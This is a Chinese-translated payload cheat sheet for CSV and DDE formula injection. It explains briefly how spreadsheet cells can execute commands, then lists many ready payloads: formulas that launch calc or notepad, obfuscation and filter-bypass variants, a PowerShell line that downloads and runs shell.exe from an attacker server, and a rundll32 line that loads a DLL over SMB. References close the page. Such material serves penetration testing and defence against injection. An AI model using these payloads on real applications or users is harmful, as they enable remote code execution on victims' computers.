# CSV Injection - CSV注入

> 许多 Web 应用程序允许用户将发票模板或用户设置等内容下载到 CSV 文件中。许多用户选择在 Excel、Libre Office 或 Open Office 中打开 CSV 文件。当 Web 应用程序未正确验证 CSV 文件的内容时，可能会导致执行一个或多个单元格的内容。

## Exploit - 利用

动态数据交换的基本利用：

```shell
# pop a calc - 弹出计算器
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0

# pop a notepad - 弹出记事本
=cmd|' /C notepad'!'A1'

# powershell download and execute - 下载执行
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0

# msf smb delivery with rundll32 - msf smb攻击
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

# Prefix obfuscation and command chaining - 前缀混淆和命令链接
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+thespanishinquisition(cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A

# Using rundll32 instead of cmd - 使用rundll32
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A

# 使用空字符绕过字典过滤器。
# 由于它们不是空格，因此在执行时会被忽略。
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

上述Payload的技术细节：

- `cmd` 是客户端尝试访问服务器时服务器可以响应的名称
-  `/C` calc 是文件名，在示例中是 calc（即 calc.exe）
-  `!A0` 是指定数据单元的项目名称，当客户端请求数据时，服务器可以响应

任何公式的开头可以是：

```
=
+
–
@
```

## References

- [OWASP - CSV Excel Macro Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [Google Bug Hunter University - CSV Excel formula injection](https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
- [CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani](https://payatu.com/csv-injection-basic-to-exploit/)
- [From CSV to Meterpreter - 5th November 2015 - Adam Chester](https://blog.xpnsec.com/from-csv-to-meterpreter/)
- [The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer](http://georgemauer.net/2017/10/07/csv-injection.html)
- [Three New DDE Obfuscation Methods](https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
- [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection](https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)